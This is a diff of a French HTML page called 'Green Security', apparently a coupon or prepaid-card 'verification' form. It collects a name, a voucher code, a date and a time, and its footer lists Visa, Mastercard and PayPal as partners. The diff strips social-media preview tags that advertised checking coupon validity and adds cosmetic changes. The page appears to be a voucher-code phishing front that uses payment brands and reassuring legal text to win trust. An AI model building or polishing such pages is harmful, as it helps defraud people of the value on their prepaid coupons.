@@ -1,25 +1,12 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Green Security - Vérification de coupon</title>
-
-  <!-- Police Google Fonts -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Green Security - Formulaire de vérification</title>
+  <meta name="description" content="Formulaire de vérification sécurisé pour Green Security.">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:;">
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
-<!-- Open Graph pour Facebook et Discord -->
-<meta property="og:title" content="Green Security - Vérification de coupon" />
-<meta property="og:description" content="Vérifiez la validité de votre carte ou coupon d'achat en ligne." />
-<meta property="og:image" content="https://aky-crimi.github.io/Green_Security/preview.png" />
-<meta property="og:url" content="https://aky-crimi.github.io/Green_Security/" />
-<meta property="og:type" content="website" />
-
-<!-- Twitter Card -->
-<meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:title" content="Green Security - Vérification de coupon" />
-<meta name="twitter:description" content="Vérifiez vos coupons d’achat en ligne rapidement et gratuitement." />
-<meta name="twitter:image" content="https://aky-crimi.github.io/Green_Security/preview.png" />
-  
   <style>
     body {
       font-family: 'Poppins', sans-serif;
@@ -42,12 +29,10 @@
     main {
       padding: 20px;
       max-width: 600px;
-      margin: auto;
+      margin: 30px auto;
       background: white;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
       border-radius: 10px;
-      margin-top: 30px;
-      margin-bottom: 30px;
     }
 
     form {
@@ -61,6 +46,7 @@
     }
 
     input[type="text"],
+    input[type="email"],
     input[type="date"],
     input[type="time"],
     input[type="submit"] {
@@ -76,6 +62,7 @@
       color: white;
       cursor: pointer;
       margin-top: 20px;
+      transition: background 0.3s;
     }
 
     input[type="submit"]:hover {
@@ -84,7 +71,7 @@
 
     footer {
       background-color: #0f0f0f;
-      color: #ccc;
+      color: #e0e0e0;
       padding: 30px 20px;
       font-size: 14px;
       text-align: center;
@@ -93,6 +80,12 @@
     footer img {
       height: 30px;
       margin: 10px;
+      opacity: 0.8;
+      transition: opacity 0.3s;
+    }
+
+    footer img:hover {
+      opacity: 1;
     }
 
     @media (max-width: 600px) {
@@ -121,8 +114,8 @@
       <label for="name">Nom :</label>
       <input type="text" id="name" name="name" required>
 
-      <label for="code">Code (Alphanumérique) :</label>
-      <input type="text" id="code" name="code" required pattern="[A-Za-z0-9]+">
+      <label for="code">Code (alphanumérique) :</label>
+      <input type="text" id="code" name="code" required pattern="[A-Za-z0-9]+" title="Utilisez uniquement des lettres et des chiffres.">
 
       <label for="date">Date :</label>
       <input type="date" id="date" name="date" required>
@@ -130,26 +123,27 @@
       <label for="heure">Heure :</label>
       <input type="time" id="heure" name="heure" required>
 
-      <input type="submit" value="Envoyer">
+      <input type="submit" value="Envoyer" onclick="this.value='Envoi en cours…';">
     </form>
   </main>
 
   <footer>
     <div>
-      <h3 style="color: #00ff99;">Mentions légales & Conditions d’utilisation</h3>
-      <p>Ce site est édité par Green Security. L’utilisation de ce formulaire implique l’acceptation des conditions générales. Vos données sont traitées de manière confidentielle et sécurisée.</p>
+      <h3 style="color: #00ff99;">Mentions légales & Conditions</h3>
+      <p>Ce site est édité par Green Security. L’utilisation du formulaire implique l’acceptation des conditions générales. Les données saisies sont traitées de manière confidentielle et sécurisée.</p>
       <p>Toute tentative de fraude ou d’abus peut entraîner des sanctions légales.</p>
+      <p>
+        <a href="mentions.html" style="color:#00ff99;">Mentions légales</a> |
+        <a href="conditions.html" style="color:#00ff99;">Conditions d’utilisation</a>
+      </p>
     </div>
-
     <hr style="margin: 20px 0; border-color: #333;">
-
     <h4>Nos partenaires</h4>
     <div>
       <img src="Visa.png" alt="Visa">
       <img src="Mastercard.png" alt="Mastercard">
       <img src="Paypal.png" alt="PayPal">
     </div>
-
     <p style="margin-top: 20px; font-size: 12px;">&copy; 2025 Green Security. Tous droits réservés.</p>
   </footer>
 
